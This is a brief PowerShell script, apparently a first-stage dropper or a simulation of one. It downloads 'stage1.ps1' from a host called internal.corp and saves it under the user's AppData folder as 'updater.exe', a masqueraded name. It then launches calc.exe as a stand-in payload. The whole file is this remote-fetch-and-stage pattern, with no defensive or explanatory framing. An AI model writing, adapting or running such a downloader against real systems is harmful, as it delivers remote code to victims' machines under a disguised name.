
[CmdletBinding()]
param(
    [string]$TransferUrl = "http://internal.corp:80/stage1.ps1",
    [string]$LocalPath = "$env:APPDATA\updater.exe",
    [int]$RequestTimeout = 53
)
$ErrorActionPreference = "Stop"

function Invoke-Stage1Download {
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-Verbose "Beginning first stage"
    $ResultObject = Invoke-Stage1Download -SourceUrl $TransferUrl -DestinationPath $LocalPath -TimeoutSec $RequestTimeout
    if ($ResultObject) {
        Start-Process -FilePath "calc.exe"
    }
}
catch {
    Write-Warning "Stage 1 retrieval failed: $($_.Exception.Message)"
}
$ProgressPreference = "SilentlyContinue"
